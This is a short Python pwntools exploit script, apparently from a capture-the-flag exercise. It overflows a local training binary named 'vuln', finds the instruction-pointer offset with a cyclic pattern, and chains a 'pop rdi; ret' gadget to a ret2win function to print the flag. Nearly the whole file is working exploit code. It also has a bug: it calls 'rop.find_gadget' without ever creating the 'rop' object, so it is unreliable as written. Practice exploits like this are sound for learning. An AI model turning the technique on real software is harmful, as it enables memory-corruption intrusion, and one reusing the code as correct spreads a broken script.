from pwn import *

# Use to find EIP/RIP if you want :)


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP offset
offset = find_eip(cyclic(100))

# Start program
io = process()

# Gadgets
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

# Print out the target addresses/gadgets
info("%#x pop rdi; ret", pop_rdi)

# Build the payload
payload = flat(
    asm('nop') * offset,
    pop_rdi,
    0xdeadbeef,
    elf.symbols.ret2win  # pwn???
)

# gdb.attach(io, gdbscript='''
# init-pwndbg
# break *0x40069a
# ''')

# Send the payload
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
